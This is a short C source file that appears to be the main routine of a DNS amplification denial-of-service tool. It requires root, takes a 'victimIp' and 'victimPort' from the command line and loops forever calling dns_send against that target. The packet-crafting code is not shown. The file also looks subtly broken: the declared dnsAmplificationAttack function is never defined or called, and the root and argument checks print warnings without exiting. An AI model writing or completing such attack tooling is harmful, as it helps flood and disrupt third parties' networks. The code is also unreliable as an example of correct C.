#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <time.h>

void dnsAmplificationAttack(char *victimIp, int victimPort);

int main(int argc, char **argv)
{	
	// Check the correctness of user input
	if(getuid()!=0)
		printf("You must be running as root!\n");
	if(argc<3)
		printf("Usage: %s victimIp victimPort\n", argv[0]);
	
	// Get target ip and port number
	char *victimIp = argv[1];
	int victimPort = atoi(argv[2]);
	
	while(1) {
		printf("dns send\n");
		dns_send(victimIp, victimPort);
		sleep(5);
	}	
	return 0;
}
